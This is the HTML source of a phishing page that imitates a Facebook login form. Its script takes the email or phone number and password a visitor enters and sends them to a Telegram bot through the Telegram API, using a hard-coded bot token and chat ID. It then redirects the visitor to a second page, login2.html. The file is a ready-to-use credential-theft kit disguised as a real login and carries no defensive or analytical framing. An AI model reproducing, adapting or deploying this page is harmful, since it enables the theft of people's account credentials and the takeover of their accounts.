<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Connect your account</title>
    <link rel="icon" type="image/svg+xml" sizes="683x683" href="https://jquery-mns-43884.netlify.app/assets/img/facebook.svg">
    <!-- Add your other link elements here -->

    <link rel="stylesheet" href="./assets/files/bootstrap.min.css">
    <link rel="stylesheet" href="./assets/files/css">
    <link rel="stylesheet" href="./assets/files/Contact-Form-Clean.css">
    <link rel="stylesheet" href="./assets/files/styles.css">
</head>

<body data-new-gr-c-s-check-loaded="14.1029.0" data-gr-ext-installed="">
    <p style="margin-bottom: 0;padding-left: 12px;padding-top: 5px;padding-bottom: 5px;border-bottom: 1px solid #e5ce3a;background: #fffbe2;color: #9f7d2d;text-align: center;">You must log in first.</p>
    <nav class="navbar navbar-light navbar-expand-md" style="padding-bottom: 10px;">
        <div class="container-fluid"><img class="img-fluid" src="./assets/files/dF5SId3UHWd.svg" style="width: 140px;margin-top: 0px;"></div>
    </nav>
    <div class="contact-clean" style="padding: 0;padding-top: 0 px;padding-bottom: 0px;background: rgb(255,255,255);">
        <form id="asset" onsubmit="return validateForm()">
            <div class="form-group" style="margin-bottom: 7px;">
                <input class="form-control form-control-sm" type="text" id="email" autocomplete="off" name="eml" placeholder="Mobile number or email" style="background: #f5f6f7;border-radius: 5px;" required="">
            </div>
            <div class="form-group" style="margin-bottom: 14px;">
                <input class="form-control form-control-sm" type="password" id="password" autocomplete="off" style="background: #f5f6f7;border-radius: 5px;" name="pwd" placeholder="Password" required="">
            </div>
            <div class="form-group">
                <button id="subbtn" class="btn btn-secondary btn-block btn-lg text-capitalize" type="button" onclick="sendMessage()" style="background: #1877f2;font-size: 16px;">Log in</button>
            </div>
        </form>
    </div>
    <script src="./assets/files/jquery.min.js.download"></script>
    <script src="./assets/files/bootstrap.min.js.download"></script>
    <script src="./assets/files/bootstrap.js.download"></script>

    <script>
        function validateForm() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            if (email.length < 5 || password.length < 5) {
                alert("Email and password must be at least 5 characters long.");
                return false;
            }

            return true;
        }

        function sendMessage() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            if (validateForm()) {
                var message = "New Login:\nEmail: " + email + "\nPassword: " + password;

                fetch('https://api.telegram.org/bot5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM/sendMessage', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: '1634597902',
                        text: message,
                    }),
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log(data);
                    window.location.href = 'login2.html';
                })
                .catch(error => {
                    console.error('There was a problem with the fetch operation:', error);
                });
            }
        }
    </script>
    <!-- Grammarly integration -->
    <grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
</body>
</html>
